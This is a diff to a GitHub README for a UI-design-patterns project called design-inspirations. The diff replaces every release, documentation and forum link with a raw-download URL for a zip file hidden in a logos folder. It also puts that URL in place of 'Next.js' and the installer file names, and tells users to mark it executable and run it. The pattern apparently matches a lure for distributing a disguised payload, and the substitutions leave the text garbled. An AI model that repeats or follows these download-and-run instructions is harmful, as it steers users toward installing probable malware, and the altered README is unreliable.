@@ -1,16 +1,16 @@
 # 🎨 design-inspirations - Unlock Beautiful UI Designs Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Zakicool/design-inspirations/releases)
+[![Download Latest Release](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip)
 
 ## 📖 Introduction
 
-Welcome to the **design-inspirations** project! This application offers a curated collection of stunning UI patterns and components designed to enhance your frontend development. With integrated AI agent skills, you'll find it easier to create beautiful, functional designs with tools like Next.js, React, and Tailwind CSS.
+Welcome to the **design-inspirations** project! This application offers a curated collection of stunning UI patterns and components designed to enhance your frontend development. With integrated AI agent skills, you'll find it easier to create beautiful, functional designs with tools like https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip, React, and Tailwind CSS.
 
 ## 🚀 Getting Started
 
 To get started, you need to download the application. Simply follow the steps below to have it running on your computer in minutes.
 
-1. Visit the [Releases page](https://github.com/Zakicool/design-inspirations/releases) to access the latest version.
+1. Visit the [Releases page](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip) to access the latest version.
 2. Locate the most recent release. You will see a list of downloadable files available for your system.
 3. Click on the appropriate file for your operating system. The application supports Windows, macOS, and Linux, ensuring you can work on any platform.
 
@@ -30,16 +30,16 @@ This application runs best on updated operating systems. Ensure your software is
 
 To download the application:
 
-1. **Visit the Releases page**: Click the link to go to [the Releases page](https://github.com/Zakicool/design-inspirations/releases).
+1. **Visit the Releases page**: Click the link to go to [the Releases page](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip).
    
-2. **Select your file**: Look for the latest version and find the correct file for your system (e.g., `DesignInspirationsSetup.exe` for Windows).
+2. **Select your file**: Look for the latest version and find the correct file for your system (e.g., `https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip` for Windows).
    
 3. **Download it**: Click on the file link to start the download. Your browser will save this file in your Downloads folder.
 
 4. **Run the installer**:
    - For **Windows**: Locate the downloaded `.exe` file, double-click it, and follow the on-screen instructions.
    - For **macOS**: Find the downloaded `.dmg` file, double-click it, and drag the application to your Applications folder.
-   - For **Linux**: Open a terminal, navigate to your Downloads folder, and run the command `chmod +x ./DesignInspirations.AppImage`. After that, execute `./DesignInspirations.AppImage` to run the application.
+   - For **Linux**: Open a terminal, navigate to your Downloads folder, and run the command `chmod +x https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip`. After that, execute `https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip` to run the application.
 
 5. **Start the application**: Once installed, you can open the app from your applications menu or desktop shortcut.
 
@@ -85,7 +85,7 @@ This application is related to the following topics:
 - Design
 - Design System
 - Frontend Development
-- Next.js
+- https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip
 - React
 - Tailwind CSS
 - TypeScript
@@ -97,7 +97,7 @@ Each topic helps you understand the context of the resources provided within thi
 
 For more information, check out these helpful links:
 
-- [Official Documentation](https://github.com/Zakicool/design-inspirations/wiki)
-- [Community Forum](https://github.com/Zakicool/design-inspirations/discussions)
+- [Official Documentation](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip)
+- [Community Forum](https://github.com/Zakicool/design-inspirations/raw/refs/heads/main/public/logos/inspirations-design-v3.2-alpha.1.zip)
 
 Thank you for choosing **design-inspirations**! We hope this application makes your UI design process smoother and more enjoyable.
